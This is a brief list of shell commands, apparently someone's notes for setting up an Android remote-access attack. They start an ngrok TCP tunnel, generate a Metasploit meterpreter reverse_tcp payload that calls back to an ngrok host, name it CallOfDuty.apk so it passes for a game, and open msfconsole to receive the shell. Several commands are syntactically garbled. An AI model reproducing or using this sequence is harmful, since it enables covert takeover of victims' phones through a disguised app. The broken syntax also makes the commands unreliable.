sudo apt update && //sudo apt upgrade
sudo apt install -y adb apache2 
sudo cp /sdcard/Download/ngrok /root
cd /root
sudo ./ngrok tcp 8080
msfvenom -p /android/meterpreter/reverse_tcp LHOST=6.tcp.ngrok.io LPORT=15298 /root <R CallOfDuty.apk
msfconsole
